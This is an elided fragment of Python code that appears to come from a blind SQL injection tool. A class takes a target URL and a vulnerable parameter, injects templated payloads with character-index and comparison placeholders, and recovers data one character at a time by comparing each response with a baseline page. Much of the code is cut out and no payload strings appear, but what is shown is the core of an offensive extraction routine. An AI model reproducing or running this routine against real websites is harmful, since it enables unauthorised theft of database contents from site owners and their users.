...
class Get():
    ...
    def __init__(self, target, vulnParam, headers):
        ...
        # vuln param
        if type(vulnParam) == str:
            self.vulnParam = vulnParam
        else:
            errorDetected.append('[!] vuln parameter must be string')
        # vuln param
    ...
    def execute(self):
        ...
        def request(payload, index, operator, range):
            payload = (self.target.replace(
                self.vulnParam, ((self.vulnParam+payload.replace('{#}', str(index))).replace('>', operator)).replace('{$}', str(range))))
            if not self.normal:
                self.normal = req.get(self.target, headers=self.headers).text
            response = req.get(payload, headers=self.headers).text
            if response in self.normal:
                return chr(range)
            else:
                return False
        # requesting
